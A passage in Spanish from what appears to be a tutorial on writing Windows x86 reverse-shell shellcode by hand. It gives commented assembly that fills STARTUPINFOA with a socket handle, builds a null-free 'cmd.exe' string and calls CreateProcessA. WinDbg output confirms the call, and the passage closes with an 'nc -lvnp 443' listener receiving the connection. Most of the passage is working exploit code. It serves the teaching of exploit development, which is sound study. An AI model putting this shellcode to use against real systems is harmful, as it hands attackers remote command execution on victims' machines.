</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwXCountChars<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwYCountChars<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwFillAttribute<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">DWORD</span>  dwFlags<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">WORD</span>   wShowWindow<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">WORD</span>   cbReserved2<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">LPBYTE</span> lpReserved2<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">HANDLE</span> hStdInput<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">HANDLE</span> hStdOutput<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++">    <span class="z-support z-type z-windows z-c">HANDLE</span> hStdError<span class="z-punctuation z-terminator z-c++">;</span>
</span></span><span class="z-source z-c++"><span class="z-meta z-block z-c++"><span class="z-punctuation z-section z-block z-end z-c++">}</span></span> <span class="z-entity z-name z-type z-typedef z-c++">STARTUPINFOA</span><span class="z-punctuation z-terminator z-c++">;</span> <span class="z-keyword z-operator z-c">*</span>LPSTARTUPINFOA<span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>La mayoria de los miembros de la estructura podemos establecerlos en nulo.</p>
<p>EL primero miembro que debemos definir es <code>cb</code>, que requiere el tamaño de la esctructura, podemos calcular el tamaño volcándola:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; dt STARTUPINFOA
</span><span class="z-text z-plain">ole32!STARTUPINFOA
</span><span class="z-text z-plain">   +0x000 cb               : Uint4B
</span><span class="z-text z-plain">   +0x004 lpReserved       : Ptr32 Char
</span><span class="z-text z-plain">   +0x008 lpDesktop        : Ptr32 Char
</span><span class="z-text z-plain">   +0x00c lpTitle          : Ptr32 Char
</span><span class="z-text z-plain">   +0x010 dwX              : Uint4B
</span><span class="z-text z-plain">   +0x014 dwY              : Uint4B
</span><span class="z-text z-plain">   +0x018 dwXSize          : Uint4B
</span><span class="z-text z-plain">   +0x01c dwYSize          : Uint4B
</span><span class="z-text z-plain">   +0x020 dwXCountChars    : Uint4B
</span><span class="z-text z-plain">   +0x024 dwYCountChars    : Uint4B
</span><span class="z-text z-plain">   +0x028 dwFillAttribute  : Uint4B
</span><span class="z-text z-plain">   +0x02c dwFlags          : Uint4B
</span><span class="z-text z-plain">   +0x030 wShowWindow      : Uint2B
</span><span class="z-text z-plain">   +0x032 cbReserved2      : Uint2B
</span><span class="z-text z-plain">   +0x034 lpReserved2      : Ptr32 UChar
</span><span class="z-text z-plain">   +0x038 hStdInput        : Ptr32 Void
</span><span class="z-text z-plain">   +0x03c hStdOutput       : Ptr32 Void
</span><span class="z-text z-plain">   +0x040 hStdError        : Ptr32 Void
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; ?? sizeof(STARTUPINFOA)
</span><span class="z-text z-plain">unsigned int 0x44
</span></code></pre>
<p>El segundo miembro que debemos considerar es <code>dwFlags</code>. Determina si se utilizan ciertos miembros de la estructura <code>STARTUPINFOA</code> al crear una ventana. Necesitaremos configurar este miembro con el indicador <code>STARTF_USESTDHANDLES</code> para habilitar los miembros <strong>hStdInput, hStdOutput y hStdError</strong></p>
<p>Vale la pena mencionar que si se especifica este indicador, los controladores del proceso de llamada deben ser heredables y el parámetro bInheritHandles debe establecerse en VERDADERO.</p>
<p>Dado que estableceremos la bandera <strong>STARTF_USESTDHANDLES</strong> , también debemos establecer los miembros que esta bandera habilita. La documentación oficial indica que todos estos miembros aceptan un identificador, que recibe entrada (<strong>hStdInput</strong>), salida (<strong>hStdOutput</strong>) y gestión de errores (<strong>hStdError</strong>).</p>
<p>Para interactuar con el proceso cmd.exe a través de nuestro socket, podemos especificar el descriptor de socket obtenido de la llamada a la API WSASocketA como identificador.</p>
<p>Dividiremos el shellcode en varias funciones:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">create_startupinfoa:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta hStdError
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta hStdOutput
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta hStdInput
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor     eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpReserved2
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta cbReserved2 &amp; wShowWindow
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov     al, 0x80;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve 0x80 a AL
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor     ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null ECX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov     cx, 0x80;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve 0x80 a CX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add     eax, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Añade a EAX 0x100
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwFlags
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor     eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwFillAttribute
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwYCountChars
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwXCountChars
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwYSize
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwXSize
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwY
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwX
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpTitle
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpDesktop
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpReserved
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov     al, 0x44;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve 0x44 a AL
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta cb
</span></span><span class="z-source z-python">
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push    esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta el puntero de la estructura STARTUPINFOA
</span></span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pop     edi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guarda el puntero de STARTUPINFOA en EDI
</span></span></code></pre>
<p>Primero, presentamos la función <code>create_startupinfoa</code> , que es responsable de crear <strong>STARTUPINFOA</strong> y obtener un puntero a él para su uso posterior.</p>
<p>A continuación, enviamos el registro ESI, que actualmente contiene nuestro descriptor de socket, a la pila tres veces. Esto establece los miembros <code>hStdInput</code>, <code>hStdOutput</code> y <code>hStdError</code> .</p>
<p>A esta instrucción le sigue la inserción de dos dwords nulos que configuran <code>lpReserved2</code>, <code>cbReserved2</code>, y miembros de <code>wShowWindow</code>.</p>
<p>Siguiendo la lógica de nuestra función, establecemos los registros AL y CX en <code>0x80</code> y los sumamos, almacenando el resultado en EAX. Este valor se introduce como miembro <code>dwFlags</code>.</p>
<p>El único otro parámetro que no se establece en nulo es <strong>cb</strong>, que se establece en el tamaño de la estructura (<code>0x44</code>).</p>
<p>Como paso final en la función <code>create_startupinfoa</code> , insertamos el registro ESP, lo que nos proporciona un puntero a la estructura <code>STARTUPINFOA</code> en la pila. Luego, insertamos ese valor en EDI.</p>
<p>El siguiente paso es almacenar la cadena "<code>cmd.exe</code>" y obtener un puntero a ella:</p>
<pre class="z-code"><code><span class="z-text z-plain">&quot;create_cmd_string:&quot;
</span><span class="z-text z-plain">    &quot;mov    eax, 0xff9a879b;&quot;     # Mueve 0xff9a879b a EAX
</span><span class="z-text z-plain">    &quot;neg    eax;&quot;                 # Niega EAX, EAX = 00657865
</span><span class="z-text z-plain">    &quot;push   eax;&quot;                 # Inserta una parte de la cadena &quot;cmd.exe&quot;
</span><span class="z-text z-plain">    &quot;push   0x2e646d63;&quot;          # Inserta el resto de la cadena &quot;cmd.exe&quot; 
</span><span class="z-text z-plain">    &quot;push   esp;&quot;                 # Inserta el puntero de la cadena &quot;cmd.exe&quot; 
</span><span class="z-text z-plain">    &quot;pop    ebx;&quot;                 # Guarda el puntero de la cadena en EBX
</span></code></pre>
<p>Las instrucciones comienzan moviendo un valor negativo a EAX, que le sigue una instrucción <code>neg</code>, que generará la última parte de la cadena como nulo para evitar bytes nulos. Después se inserta la última parte de la cadena cmd.exe y se guarda en ebx para usarla posteriormente.</p>
<p>Ya tan solo quedaría definir la función <code>call_createprocessa</code>:</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call_createprocessa:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span><span class="z-punctuation z-terminator z-statement z-python">;</span>                 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov eax, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> mueve ESP a EAX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null ECX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov cx, 0x390;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Mueve 0x390 a CX (tamaño de PROCESS_INFORMATION)
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub eax, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Resta CX de EAX to para reservar espacio
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpProcessInformation
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push edi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpStartupInfo
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor eax, eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpCurrentDirectory
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpEnvironment
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta dwCreationFlags
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">inc eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Pone EAX en 1 (TRUE)
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta bInheritHandles
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">dec eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                             <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Null EAX otra vez
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpThreadAttributes
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpProcessAttributes
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push ebx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpCommandLine
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                            <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Inserta lpApplicationName
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x1c];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamar a  CreateProcessA
</span></span></code></pre>
<p>La función call_createprocessa comienza moviendo el registro ESP a EAX y restándole <code>0x390</code> con la ayuda de ECX. Este es el mismo paso que realizamos al llamar a la API <code>WSAStartup</code> , que rellenó la estructura WSADATA.</p>
<p>A continuación, insertamos un puntero a la estructura STARTUPINFOA que almacenamos previamente en EDI. Esta instrucción va seguida de tres dwords nulos, que establecen los tres argumentos siguientes.</p>
<p>Luego, aumentamos EAX, haciendo que el registro contenga el valor <code>0x01</code> (TRUE) y lo enviamos como argumento <code>bInheritHandles</code> . Después, disminuimos el registro, restableciéndolo a nulo, y enviamos dos dwords nulos.</p>
<p>La línea que contiene <code>"push ebx;"</code> (lpCommandLine), requiere un puntero a una cadena que representa el comando a ejecutar, se inserta en la pila mediante el registro EBX definido en un paso anterior. Finalmente, establecemos el argumento <code>lpApplicationName</code> en nulo y llamamos a la API.</p>
<p>Para comprobar que funciona correctamente, establezcamos un punto de interrupción en la llamada a <code>CreateProccesA</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; bp 012a016c
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">ModLoad: 74c40000 74c96000   C:\Windows\system32\mswsock.dll
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00000000 ebx=02f9f26c ecx=00000390 edx=77573060 esi=00000218 edi=02f9f274
</span><span class="z-text z-plain">eip=012a016c esp=02f9f244 ebp=02f9f8fc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">012a016c ff551c          call    dword ptr [ebp+1Ch]  ss:0023:02f9f918={KERNEL32!CreateProcessAStub (773d7570)}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=00000001 ebx=02f9f26c ecx=b76b73f3 edx=012b0000 esi=00000218 edi=02f9f274
</span><span class="z-text z-plain">eip=012a016f esp=02f9f26c ebp=02f9f8fc iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">012a016f 0000            add     byte ptr [eax],al          ds:0023:00000001=??
</span></code></pre>
<p>Conexion establecida:</p>
<pre class="z-code"><code><span class="z-text z-plain">dreamer@debian:~/$ sudo nc -lvnp 443
